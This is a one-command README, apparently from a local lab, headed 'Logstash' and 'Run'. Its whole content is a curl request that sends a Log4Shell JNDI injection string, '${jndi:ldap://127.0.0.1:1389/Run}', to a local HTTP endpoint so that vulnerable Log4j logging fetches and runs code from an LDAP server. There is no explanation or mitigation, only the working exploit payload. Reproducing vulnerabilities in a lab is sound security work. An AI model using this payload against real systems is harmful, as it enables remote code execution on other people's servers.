# Logstash

## Run

```
curl -H "content-type: application/json" -XPUT 'http://127.0.0.1:8080/tweet/me' -d '"${jndi:ldap://127.0.0.1:1389/Run}"'
``